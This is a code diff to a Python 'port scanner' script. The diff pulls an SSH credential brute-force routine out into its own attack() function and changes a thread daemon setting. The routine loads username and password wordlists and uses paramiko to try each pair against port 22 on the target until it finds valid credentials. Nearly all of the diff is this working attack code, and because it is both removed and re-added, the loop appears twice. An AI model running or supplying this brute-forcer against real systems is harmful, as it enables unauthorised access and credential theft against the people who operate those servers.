@@ -17,6 +17,59 @@ init(autoreset=True)
 subprocess.call('clear', shell=True)
 
 
+def attack():
+    q.task_done()
+    usr_arr = [];
+    pass_arr = []
+    try:
+        os.system('cls' if os.name == 'nt' else 'clear')
+        user_list = os.path.abspath('users.txt')
+        pass_list = file = os.path.abspath('passes.txt')
+        print(termcolor.colored("[+] BruteForce Started....", 'blue'))
+        print('\n')
+    except KeyboardInterrupt:
+        print(termcolor.colored("CANCELLED", 'red'))
+        quit()
+
+    users_lis = open(user_list, "r")
+    for l in users_lis:
+        u = l.strip();
+        usr_arr.append(u)
+    users_lis.close()
+
+    passwords = open(pass_list, "r")
+    for l in passwords:
+        p = l.strip();
+        pass_arr.append(p)
+    passwords.close()
+    i = 1;
+    x = 0;
+    u = 0
+    while i == 1:
+        try:
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            print("[*] Username:", str(usr_arr[u]), "| [*] Password:", str(pass_arr[x]))
+            client.connect(username=usr_arr[u], hostname=hack, password=pass_arr[x], port=22)
+            print(termcolor.colored("[✔] Valid Credentials Found\n", 'cyan'))
+            break
+        except (paramiko.ssh_exception.AuthenticationException):
+            print(termcolor.colored("[X] Password Not Found!\n", 'red'));
+            time.sleep(0.2)
+            if x == len(pass_arr) - 1:
+                x = 0
+                if u == len(usr_arr) - 1:    break
+                u += 1
+            else:
+                x += 1
+            continue
+        except paramiko.ssh_exception.NoValidConnectionsError:
+            print(termcolor.colored("Host Error or May Be something\n", 'red'))
+            quit()
+        except:
+            time.sleep(0.3);
+            continue
+        i += 1
 
 print(Style.BRIGHT + Fore.YELLOW + "START AT:", (datetime.now()))
 print("=============COREXITAL PORT SCANNER=============")
@@ -106,58 +159,8 @@ def starthack(port):
                 if port ==22:
                     print("SSH IS OPEN!!")
                     print("ATTEMPTING BRUTEFORCE ATTACK")
-                    q.task_done()
-                    usr_arr = [];
-                    pass_arr = []
-                    try:
-                        os.system('cls' if os.name == 'nt' else 'clear')
-                        user_list = os.path.abspath('users.txt')
-                        pass_list = file = os.path.abspath('passes.txt')
-                        print(termcolor.colored("[+] BruteForce Started....", 'blue'))
-                        print('\n')
-                    except KeyboardInterrupt:
-                        print(termcolor.colored("CANCELLED", 'red'))
-                        quit()
 
-                    users_lis = open(user_list, "r")
-                    for l in users_lis:
-                        u = l.strip();
-                        usr_arr.append(u)
-                    users_lis.close()
-
-                    passwords = open(pass_list, "r")
-                    for l in passwords:
-                        p = l.strip();
-                        pass_arr.append(p)
-                    passwords.close()
-                    i = 1;
-                    x = 0;
-                    u = 0
-                    while i == 1:
-                        try:
-                            client = paramiko.SSHClient()
-                            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                            print("[*] Username:", str(usr_arr[u]), "| [*] Password:", str(pass_arr[x]))
-                            client.connect(username=usr_arr[u], hostname=hack, password=pass_arr[x], port=22)
-                            print(termcolor.colored("[✔] Valid Credentials Found\n", 'cyan'))
-                            break
-                        except (paramiko.ssh_exception.AuthenticationException):
-                            print(termcolor.colored("[X] Password Not Found!\n", 'red'));
-                            time.sleep(0.2)
-                            if x == len(pass_arr) - 1:
-                                x = 0
-                                if u == len(usr_arr) - 1:    break
-                                u += 1
-                            else:
-                                x += 1
-                            continue
-                        except paramiko.ssh_exception.NoValidConnectionsError:
-                            print(termcolor.colored("Host Error or May Be something\n", 'red'))
-                            quit()
-                        except:
-                            time.sleep(0.3);
-                            continue
-                        i += 1
+                    attack()
 
             else:
                 print("-----------------------------------------")
@@ -206,7 +209,7 @@ for x in range(thr):
 
     # classifying as a daemon, so they it will
     # die when the main dies
-    t.daemon = True
+    t.daemon = False
 
     # begins, must come after daemon definition
     t.start()
